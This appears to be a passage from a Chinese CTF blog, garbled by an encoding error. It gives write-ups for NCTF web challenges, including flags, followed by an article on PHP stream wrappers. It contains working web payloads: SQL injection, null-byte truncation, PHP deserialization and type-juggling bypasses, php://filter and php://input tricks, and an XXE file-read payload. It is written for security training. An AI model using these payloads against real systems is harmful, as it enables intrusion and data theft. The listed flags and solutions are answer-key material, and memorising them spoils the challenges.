((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (c^_^o)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) # (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((o^_^o) +(o^_^o))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (o^_^o)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (o^_^o)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((o^_^o) # (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (o^_^o)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (o^_^o)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((o^_^o) +(o^_^o))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (o^_^o)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) # (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]) (ï¾ŸÎ˜ï¾Ÿ)) (&#39;_&#39;); è„‘æ´žåŠ å¯†æ–¹å¼ http://www.tuicool.com/articles/2E3INnmfirebug ç²˜è´´åŽ è¿è¡Œ nctf{javascript_aaencode} 7ã€çœ‹èµ·æ¥åƒæ˜¯è€é¢˜ burpsuitæŠ“åŒ… 8ã€referå¤´éƒ¨ä¿®æ”¹ncf{http_referer} 9ã€nctf{gzip_base64_hhhhhh} 10ã€filteræ–¹å¼è¯»å–æºç http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.phpå¾—åˆ°base64ç¼–ç  å¹¶è§£ç å¾—åˆ° 11ã€burpsuitæŠ“åŒ…ï¼Œ sendtorepeater å¯ä»¥å‘çŽ°æœ‰é‡å®šå‘ ä¸€ä¸ªä¸ªæ…¢æ…¢ç¿» nctf{this_is_302_redirect} 12ã€æç¤ºä¸‹è½½å…¶ä»–ä¸œè¥¿ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå‘çŽ°ä¸‹è½½è¿žæŽ¥ä¸º download.php?url=[base64]å·²çŸ¥çš„æ–‡ä»¶æœ‰ download.php å°è¯•ä¸‹è½½ download.php -ã€‹ ZG93bmxvYWQucGhw å¹¶æŸ¥çœ‹æ‰€ä»¥ç»§ç»­ä¸‹è½½ hereiskey.php -&gt; nctf{download_any_file_666} 13ã€é¡µé¢æç¤º cookie burpæŠ“åŒ…è®¾ç½®cookieä¸º0 åŽå‘çŽ°å³è¾¹å‡ºçŽ° Login=0å°†cookieè®¾ç½®ä¸º Login=1 nctf{cookie_is_different_from_session} 14ã€ è®¿é—®http://chinalover.sinaapp.com/web11/robots.txtåˆ«å¤ªå¼€å¿ƒï¼Œflagä¸åœ¨è¿™ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ç”¨é€”ä½ çœ‹å®Œäº†ï¼Ÿåœ¨CTFæ¯”èµ›ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶å¾€å¾€å­˜æ”¾ç€æç¤ºä¿¡æ¯TIP:sql.php &lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt; æ‰€ä»¥ç›®æ ‡æ˜¯ http://chinalover.sinaapp.com/web11/sql.php å‚æ•°æ˜¯ id è€Œä¸”å…¶ä¸­çš„é‚£ä¸ªæ•°å­— 1024 å¾ˆå¥‡æ€ªå•Š intvalæ˜¯å–æ•´å‡½æ•°ï¼Œæ‰€ä»¥è®© idç­‰äºŽ 1024.* æ¯”å¦‚1024.9999999 1024.0000001 åˆ™$id = intval($_GET[id]) åŽ $id=1024 http://chinalover.sinaapp.com/web11/sql.php?id=1024.1 nctf{query_in_mysql} 15ã€gbk æç¤ºï¼šå®½å­—èŠ‚æ³¨å…¥å…ˆæŸ¥ è¡¨å http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,table_name from information_schema.tables%23 å†æŸ¥ å­—æ®µå http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,column_name from information_schema.columns where table_name=0x666c6167%23 æŸ¥è¯¢ æ•°æ® http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,fl4g from flag %23 nctf{gbk_3sqli} èµ„æ–™ï¼šå®½å­—èŠ‚æ³¨å…¥https://www.91ri.org/8611.html 16ã€è€ƒç‚¹æ˜¯ æˆªæ–­ ç„¶è€Œâ€¦â€¦ * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[0]=a &lt;-ä¸ºä»€ä¹ˆè¿™ä¸ªæ–¹æ³•å¯ä»¥ï¼Ÿâ€¦â€¦ è¿æ°” * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu %00æˆªæ–­ %23ä¸º # flag:nctf{use_00_to_jieduan} 17ã€æ³¨æ„å’Œç¬¬äºŒé¢˜çš„åŒºåˆ«ï¼Œç¬¬äºŒé¢˜æ˜¯== è€Œè¿™ä¸€é¢˜æ˜¯ === è¦æ±‚ä¸ä»…ä»…æ˜¯å€¼ç›¸åŒ è€Œä¸”ç±»åž‹è¦ç›¸åŒï¼Œæ‰€ä»¥è¿™ä¸€é¢˜ä¸èƒ½ç”¨md5ç¢°æ’žåœ¨phpä¸­ md5() éœ€è¦ä¸€ä¸ªstringå‚æ•°ï¼Œä½†è‹¥ä¼ å…¥ä¸€ä¸ªæ•°ç»„ç±»åž‹ï¼Œå®ƒä¸ä¼šæŠ¥é”™ä½†ä¼šè¿”å›žç©ºå€¼åˆ©ç”¨è¿™ç‚¹ï¼Œæˆ‘ä»¬ä¼ å…¥ä¸¤ä¸ªæ•°ç»„è¿›è¡Œç»•è¿‡ifåˆ¤æ–­http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=0 Flag: nctf{php_is_so_cool} 18ã€å˜é‡è¦†ç›–ï¼ &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) { ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php } ?&gt; &lt;?php } ?&gt; extractå‡½æ•°â€œå¯èƒ½â€å¯¼è‡´å˜é‡è¦†ç›–æ¼æ´žï¼Œæˆ‘ä»¬ä¼ å…¥passçš„å€¼ï¼Œå¹¶ä¸”æŠŠthepassword_123çš„å€¼è¦†ç›–ä¸ºæˆ‘ä»¬éœ€è¦çš„å€¼ nctf{bian_liang_fu_gai!} 19ã€æŸ¥çœ‹index.txt &lt;?php if(eregi(â€œhackerDJâ€,$_GET[id])) { echo(â€œnot allowed!â€œ); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;; } ?&gt; &lt;br&gt;&lt;br&gt; Can you authenticate to this website? id ä¸èƒ½ä¸Ž hackerDJ ç›¸ç­‰ï¼Œè€Œä¸”idç»è¿‡ urldecodeåŽè¦ä¸Ž hackerDJç›¸åŒ http://php.net/manual/en/function.urldecode.php $_GET[]æœ¬èº«å°±æœ‰urldecodeçš„åŠŸèƒ½ è€Œä¸”å°± urlencodeï¼Œæ˜¯æŠŠå¯¹åº”çš„ASCIIç å‰é¢åŠ ä¸Š%ï¼Œurldecodeå°±æ˜¯æŠŠå¯¹åº”çš„ç¼–ç è¿˜åŽŸï¼Œè€Œæœªç»ç¼–ç çš„ä¿æŒä¸å˜ æ‰€ä»¥å¯¹hackerDJä¸­çš„ä»»æ„ä¸€ä¸ªè¿›è¡Œç¼–ç æˆ–æ˜¯å…¨éƒ¨ç¼–ç ï¼Œæ•ˆæžœç›¸åŒ http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ %2568ackerDJåœ¨ç¬¬ä¸€ä¸ªGETå¤„è¢«urldecodeæˆ %68ackerDJ ,ç»•è¿‡äº†ç¬¬ä¸€ä¸ªifåˆ¤æ–­ï¼Œ æŽ¥ç€æ˜¯ ä»£ç ä¸­çš„æ˜¾å¼urldecodeï¼Œè¢«è¿˜åŽŸæˆ hackerDJ ä»Žè€Œæ‹¿åˆ° flag 20ã€æœ¬åœ°ç™»å½•ï¼Œä¸Šburp æ·»åŠ X-Forwarded-For:127.0.0.1 nctf{happy_http_headers} 21ã€éƒ½å·²ç»æç¤ºheaderäº†burpæŠ“åŒ…ï¼ŒæŸ¥çœ‹ nctf{tips_often_hide_here} 22ã€æŸ¥çœ‹ä¸€ä¸‹æºä»£ç ï¼Œçœ‹ä¸€çœ‹upload.phpç„¶åŽæˆ‘æŠŠé‚£å¼ gif.gifçš„å›¾ç‰‡ä¼ äº†ä¸ŠåŽ»ï¼Œç»“æžœè¿™é‡Œåªå†™ä¸€ä¸‹æ­£ç¡®å§¿åŠ¿ï¼Œå…¶ä½™çš„ä¸Šä¼ ç»•è¿‡æ—¥åŽæ€»ç»“ï¼Œåœ¨uploadè¿™é‡Œæ·»ä¸Š 1.php .gif (phpå’Œ . ä¹‹é—´æ˜¯ ç©ºæ ¼é”®äº§ç”Ÿçš„ç©ºæ ¼)è¿™é‡Œçš„ 20 å°±æ˜¯phpå’Œ . ä¹‹é—´çš„ç©ºæ ¼åˆ©ç”¨ 00 æˆªæ–­ä¸Šä¼  ï¼ŒæŠŠ 20 ä¿®æ”¹ä¸º 00nctf{welcome_to_hacks_world} 23ã€ç‚¹è¿›åŽ»æ˜¯ Source ä»£ç ï¼Œæ²¡æœ‰çœ‹åˆ°æ˜¾å¼çš„è¿‡æ»¤æˆ–è½¬ä¹‰ï¼Œ trimï¼ˆï¼‰æ˜¯åŽ»é™¤ä¸¤ä¾§ç©ºæ ¼æ‰€ä»¥å°è¯•ä¼ å…¥userä¸º adminâ€™)# å…¶ä¸­ â€˜ï¼‰ç”¨æ¥åˆ†åˆ«ç”¨æ¥é—­åˆ #ç”¨æ¥æŠŠåŽé¢ç»™æ³¨é‡ŠæŽ‰è¿™æ ·æœ€åŽçš„æŸ¥è¯¢è¯­å¥ä¸º select user from ctf where (user=&#39;admin&#39;) nctf{ni_ye_hui_sql?} 24ã€æ³¨æ„æç¤ºï¼š tip:strcmp(array,string)=null=0 æ‰€ä»¥æ ¹æ®ä»£ç é€»è¾‘ï¼Œæˆ‘ä»¬ä¼ å…¥çš„passè‹¥ä¸Žpass1ç›¸ç­‰ï¼Œåˆ™è¿”å›ž0ï¼Œ ï¼strcmpåˆ™ä¸º çœŸ è¿™é‡Œæ˜¯å…³äºŽstrcmpçš„è§£é‡Šhttp://www.w3school.com.cn/php/func_string_strcmp.asp åˆ©ç”¨æç¤ºï¼Œæˆ‘ä»¬ä¼ å…¥ passæ•°ç»„ï¼Œæ¯”å¦‚ pass[]=1, è§å³ä¸Šã€‚ nctf{strcmp_is_n0t_3afe} 25ã€ä¼ å…¥åå…­è¿›åˆ¶ï¼Œå¯ä»¥ç»•è¿‡åˆ¤æ–­ï¼Œ 54975581388http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc nctf{follow_your_dream} 26ã€æ—¢ç„¶æ˜¯adminçš„å¯†ç ï¼Œæ€Žä¹ˆä¼šæ˜¯ctfuserå‘¢â€¦â€¦ ä¸Šburpsuit æ”¹ä¸€æ”¹ï¼Œç„¶è€Œä¸å¯¹ã€‚ æ³¨æ„åˆ°åœ°å€æ ï¼Œuser1ä¼ äº†ä¸€ä¸ªå‚æ•°ï¼šctfuserçš„åŠ å¯†ç»“æžœ è¿›åŽ»ï¼Œè¿™ä¸ªä¹Ÿå¿…é¡»æ”¹æŽ‰ æ‰€ä»¥æ”¹ä¸º user1=YWRtaW4= åŽé¢é‚£ä¸²æ˜¯adminçš„base64åŠ å¯†ã€‚ GO nctf{reset_password_often_have_vuln} 27ã€åœ¨xmanè®­ç»ƒè¥æ—¶æœ‰æŽ¥è§¦è¿‡æŸé¢˜ï¼Œæˆ‘ä»¬ä»¥ä¸ºå®ƒçš„è€ƒç‚¹æ˜¯ååºåˆ—åŒ–ï¼Œä½†å½“æ—¶æ²¡æœ‰ç±»ï¼ˆclassï¼‰ï¼Œæœ€åŽåªå¥½ä½œç½¢ï¼šï¼‰ &lt;?php class just4fun { var $enter; var $secret; } if (isset($_GET[&#39;pass&#39;])) { $pass = $_GET[&#39;pass&#39;]; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&#39;t fool me&quot;; } else echo &quot;are you trolling?&quot;; } ?&gt; https://www.91ri.org/3960.htmlhttp://www.freebuf.com/vuls/80293.htmlç„¶è€Œæœ‰é“åŽå®žåœ¨ç»•ä¸è¿‡åŽ»ï¼Œé‚£ä¸ª$o-&gt;secret = â€œ*â€; æˆ‘ä¸çŸ¥é“å¦‚ä½•æž„é€ æˆç›¸ç­‰â€¦â€¦å‚è€ƒç½‘ä¸Šçš„ä¸€ç¯‡â€¦â€¦http://115.159.210.46/archives/19.html &lt;?php class just4fun{ var $enter; var $secret; } $class =new just4fun(); $class-&gt;enter=&amp;$class-&gt;secret; print_r(serialize($class)) ?&gt;ç”±ä¸Šè¿°ä»£ç å¾—åˆ°æœ€åŽçš„payloadï¼š http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}æœ€åŽç¨å¾®æ€»ç»“ä¸€ä¸‹çŸ¥è¯†ç‚¹ï¼š1ï¼‰ååºåˆ—åŒ–æ¼æ´žï¼Œ2ï¼‰phpåœ¨é¢å¯¹objectä¼ å€¼æ—¶çš„â€œç‰¹æ€§â€ nctf{serialize_and_unserialize} 28ã€å¥½ç†Ÿæ‚‰çš„æ„Ÿè§‰ï¼Œçœ‹çœ‹æºä»£ç â€¦â€¦ &lt;!-- #GOAL: login as admin,then get the flag; error_reporting(0); require &#39;db.inc.php&#39;; function clean($str){ if(get_magic_quotes_gpc()){ $str=stripslashes($str); } return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET[&#39;username&#39;]); $password = @clean((string)$_GET[&#39;password&#39;]); $query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;; $result=mysql_query($query); if(!$result || mysql_num_rows($result) &lt; 1){ die(&#39;Invalid password!&#39;); } echo $flag; --&gt;Invalid password! å¥½å§ xmanå¤ä»¤è¥æ—¶åŽŸé¢˜åšè¿‡äº†SELECT FROM users WHERE name=â€™admin\â€™ AND pass=â€™ or 1 #â€™;è¿™æ ·ä¸€æ¥ name=â€™*â€˜ or 1 æ¡ä»¶æ’çœŸæ‰€ä»¥payloadæ˜¯ username=admin\&amp;password=%20or%201%23 nctf{sql_injection_is_interesting} 29ã€jsfuckâ€¦â€¦æ”¾åˆ°firebugé‡Œç›´æŽ¥è¿è¡Œä¸€ä¸‹ï¼Œå‡ºæ¥ä¸€ä¸ªæ–°é¡µé¢ï¼Œå…¶å†…å®¹å¦‚ä¸‹å›¾http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.phpè®¿é—®http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php åœ¨headeré‡Œå•Š,ä¸ŠburpsuitæŸ¥çœ‹ï¼Œå‘çŽ°tipä¸º history of bash. å¦‚ä¸‹å·¦å›¾ç™¾åº¦äº†ä¸€ä¸‹ï¼Œ å¦‚ä¸Šå³å›¾ï¼Œæ‰€ä»¥è¯•ç€è®¿é—® http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history å¾—åˆ°æ–°æç¤º zip -r flagbak.zip ./* è¿™æ˜¯å§flagbak.zipæ–‡ä»¶è§£åŽ‹åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œ æ‰€ä»¥flagbak.zipæ–‡ä»¶æœ‰å¯èƒ½ä»ç„¶å­˜åœ¨ å°è¯•è®¿é—® http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zipè§£åŽ‹ï¼Œé‡Œé¢æœ‰flag.txtæ–‡ä»¶ï¼Œæ‰“å¼€ï¼Œå¾—åˆ°flagã€‚ nctf{bash_history_means_what} 30ã€ &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#39;$user&#39;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) { echo &quot;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&quot;; } else { echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); } } ntcf{union_select_is_wtf}]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æµ…è°ˆphpä¼ªåè®®åŠåœ¨CTFæ¯”èµ›ä¸­çš„åº”ç”¨]]></title>
      <url>%2F2007%2F06%2F22%2F%E6%B5%85%E8%B0%88php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%9C%A8CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%2F</url>
      <content type="text"><![CDATA[file://åˆ©ç”¨è¯¥åè®®å¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œä»Žè€Œå¯èƒ½è¯»å–åˆ°æ•æ„Ÿæ–‡ä»¶ã€‚ ç›´æŽ¥ä½¿ç”¨ä»¥wechallä¸Šçš„ä¸€é¢˜ä¸ºä¾‹ï¼š1http://www.wechall.net/challenge/crappyshare/index.php?show=code ç¬¬215è¡Œå¼€å§‹ï¼Œæœ‰å¦‚ä¸‹ä»£ç ï¼š12345678910111213141516171819202122232425&lt;?php çœç•¥function upload_please_by_url($url)&#123; if (1 === preg_match('#^[a-z]&#123;3,5&#125;://#', $url)) # Is URL? &#123; $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_FAILONERROR, true); if (false === ($file_data = curl_exec($ch))) &#123; htmlDisplayError('cURL failed.'); &#125; else &#123; // Thanks upload_please_thx($file_data); &#125; &#125; else &#123; htmlDisplayError('Your URL looks errorneous.'); &#125;&#125;çœç•¥?&gt; curl_exec($ch)ä¸­çš„$chå¯æŽ§ï¼ŒåŽŸæœ¬æ˜¯å¸Œæœ›èƒ½curlåˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„èµ„æºï¼Œä½†è¿™é‡Œå¯ä»¥åˆ©ç”¨fileï¼š//è¯»å–åˆ°æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ã€‚1http://www.wechall.net/challenge/crappyshare/crappyshare.php ç»“åˆå…¶ä»–æ–¹æ³•æ¯”å¦‚XXEä¸­ï¼Œç»å¸¸ä½¿ç”¨å®ƒæ¥å¼•å…¥å¤–éƒ¨å®žä½“ç¬¦å·ã€‚æ¯”å¦‚ä»¥ä¸‹payloadï¼š123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///c://TEST.txt"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; æ›´è¯¦ç»†çš„å†…å®¹å¯ä»¥è§ï¼šå°è¯•XMLå®žä½“æ³¨å…¥æ”»å‡» php://http://cn2.php.net/manual/zh/wrappers.php.php è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ php://filterè¯»å–æ–‡ä»¶è¿™ä¸ªç»å¸¸åœ¨ctfæ¯”èµ›ä¸­ç”¨æ¥è¯»å–æºç ï¼Œè¿”å›žçš„æ˜¯base64åŠ å¯†åŽçš„ç»“æžœã€‚å‡è®¾index.phpæºç å¦‚ä¸‹ï¼š1234&lt;?php @include($_GET["chybeta"]); show_source(__FILE__);?&gt; åˆ©ç”¨php://filterè¯»å–index.phpæºç 1http://XXX/index.php?file=php://filter/read=convert.base64-encode/resource=index.php æœ‰æ—¶å€™ä¹Ÿå¯ä»¥ç›´æŽ¥ç”¨ä»¥ä¸‹payloadï¼š1http://XXX/index.php?file==php://filter/resource=index.php php://inputåŸºæœ¬åˆ©ç”¨php://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŽŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå¯ä»¥è¯»å–åˆ°æ¥è‡ªPOSTçš„åŽŸå§‹æ•°æ®ã€‚ä½†å½“ enctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚ 16å¹´åŽå±±æ¯ï¼Œæºç å¦‚ä¸‹ï¼š123456789101112&lt;?php$user = $_GET["user"];$file = $_GET["file"];$pass = $_GET["pass"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="the user is admin"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //class.php&#125;else&#123; echo "you are not admin ! ";&#125;?&gt; å¯ä»¥åˆ©ç”¨phpï¼š//inputã€‚å¦‚ä¸‹ï¼š ç±»ä¼¼çš„é¢˜ç›®ï¼Œåœ¨jarvisojçš„IN A messå¯è§åˆ°ã€‚ ä»£ç æ‰§è¡Œåˆ©ç”¨æ¡ä»¶ï¼šallow_url_include = Onã€‚ä¸è¿‡å…¶å®žè‹¥allow_url_include = On çš„è¯å°±å¯ä»¥ç›´æŽ¥è¿œç¨‹æ–‡ä»¶åŒ…å«äº†ï¼šï¼‰ã€‚æµ‹è¯•ä»£ç åŒä¸Šã€‚12url: http://localhost:20000/index.php?chybeta=php://inputpost: &lt;? phpinfo() ?&gt; è‹¥æ²¡æœ‰å¼€å¯allow_url_includeï¼Œåˆ™ä¼šæ‰§è¡Œå¤±è´¥ã€‚ http:// â€” è®¿é—® HTTP(s) ç½‘å€ftp:// â€” è®¿é—® FTP(s) URLs zlib:// â€” åŽ‹ç¼©æµdata:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼phar:// â€” PHP å½’æ¡£ssh2:// â€” Secure Shell 2rar:// â€” RARogg:// â€” éŸ³é¢‘æµ expect://ç”¨äºŽå¤„ç†äº¤äº’å¼çš„æµã€‚]]></content>
